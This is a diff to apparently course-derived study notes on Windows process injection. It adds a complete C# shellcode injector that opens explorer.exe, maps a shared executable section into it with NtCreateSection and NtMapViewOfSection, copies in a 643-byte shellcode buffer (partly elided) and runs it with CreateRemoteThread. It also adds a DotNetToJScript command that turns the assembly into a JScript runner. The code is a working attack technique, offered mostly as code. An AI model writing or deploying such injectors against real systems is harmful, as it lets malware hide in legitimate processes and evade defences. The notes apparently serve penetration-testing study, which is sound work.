@@ -122,6 +122,80 @@ The low-level native APIs _NtCreateSection_, _NtMapViewOfSection_, _NtUnMapViewO
 
 Create C# code that performs process injection using the four new APIs instead of _VirtualAllocEx_ and _WriteProcessMemory_. Convert the code to Jscript with DotNetToJscript. Note that _CreateRemoteThread_ must still be used to execute the shellcode.
 
+Not my code:
+```csharp
+using System;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+
+
+
+public class TestClass
+{
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+
+    [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+    static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+
+    [DllImport("ntdll.dll", SetLastError = true)]
+    static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+
+    [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
+    static extern int NtClose(IntPtr hObject);
+
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    public TestClass()
+    {
+        Process[] explorerProcesses = Process.GetProcessesByName("explorer");
+        int firstExplorerPid = explorerProcesses[0].Id;
+
+        byte[] buf = new byte[643]
+        { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
+        ...
+        0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,
+        0xd5 };
+
+        IntPtr sHandle = new IntPtr();
+        IntPtr lHandle = Process.GetCurrentProcess().Handle;
+        IntPtr pHandle = OpenProcess(0x001F0FFF, false, firstExplorerPid);
+
+
+        int len = buf.Length;
+        uint uLen = (uint)len;
+        long cStatus = NtCreateSection(ref sHandle, 0x10000000, IntPtr.Zero, ref uLen, 0x40, 0x08000000, IntPtr.Zero);
+
+        IntPtr baseAddrL = new IntPtr();
+        uint viewSizeL = uLen;
+        ulong sectionOffsetL = new ulong();
+        long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, 0x04);
+
+        IntPtr baseAddrR = new IntPtr();
+        uint viewSizeR = uLen;
+        ulong sectionOffsetR = new ulong();
+        long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, UIntPtr.Zero, UIntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, 0x20);
+
+        Marshal.Copy(buf, 0, baseAddrL, len);
+
+        CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero);
+
+        uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
+
+        int clStatus = NtClose(sHandle);
+    }
+}
+```
+```cmd
+DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
+```
 ## DLL Injection
 
 Our approach will be to try to trick the remote process into executing _LoadLibrary_ with the correct argument. Recall that when calling _CreateRemoteThread_, the fourth argument is the start address of the function run in the new thread and the fifth argument is the memory address of a buffer containing arguments for that function.
